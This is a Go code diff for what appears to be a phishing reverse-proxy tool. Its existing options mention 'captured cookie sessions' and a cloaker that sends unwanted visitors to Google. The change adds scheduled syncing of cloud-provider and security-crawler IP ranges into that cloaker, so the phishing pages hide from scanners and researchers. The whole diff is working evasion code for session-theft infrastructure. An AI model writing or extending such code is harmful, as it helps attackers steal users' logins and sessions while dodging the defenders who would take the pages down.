@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"errors"
 	"flag"
 	_log "log"
@@ -44,6 +45,8 @@ var cloaker_redirect_url = flag.String("cloaker-redirect-url", "https://www.goog
 var cloaker_action = flag.String("cloaker-action", string(asncloak.ActionRedirect), "Cloaker enforcement action: redirect or block")
 var cloaker_block_status = flag.Int("cloaker-block-status", 404, "HTTP status for the cloaker block action: 403 or 404")
 var cloaker_trust_proxy_headers = flag.Bool("cloaker-trust-proxy-headers", false, "Inspect client IP headers supplied by a trusted reverse proxy")
+var enable_ip_sync = flag.Bool("enable-ip-sync", true, "Periodically synchronize official cloud and security-crawler IP ranges")
+var ip_sync_interval = flag.Duration("ip-sync-interval", 12*time.Hour, "Interval between cloud IP range synchronizations")
 var enable_js_inspect = flag.Bool("enable-js-inspect", false, "Enable client-side browser environment verification")
 var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js", "Internal route used for client browser verification assertions")
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
@@ -306,8 +309,29 @@ func main() {
 		}
 	}
 	if *enable_cloaker {
+		var provider asncloak.Provider
+		if *enable_ip_sync {
+			syncService, syncErr := asncloak.NewSyncService(asncloak.SyncConfig{
+				Interval: *ip_sync_interval,
+				OnUpdate: func(result asncloak.SyncResult) {
+					log.Info("IP range sync published %d entries from %d feeds", result.Entries, result.SuccessfulFeeds)
+				},
+				OnError: func(syncErr error) {
+					log.Warning("IP range sync: %v", syncErr)
+				},
+			})
+			if syncErr != nil {
+				log.Fatal("IP range sync: %v", syncErr)
+				return
+			}
+			provider = syncService.Provider()
+			syncContext, cancelSync := context.WithCancel(context.Background())
+			defer cancelSync()
+			go syncService.Run(syncContext)
+		}
 		err = hp.ConfigureCloaker(asncloak.Config{
 			Enabled:           true,
+			Provider:          provider,
 			Action:            asncloak.Action(strings.ToLower(*cloaker_action)),
 			RedirectURL:       *cloaker_redirect_url,
 			BlockStatus:       *cloaker_block_status,
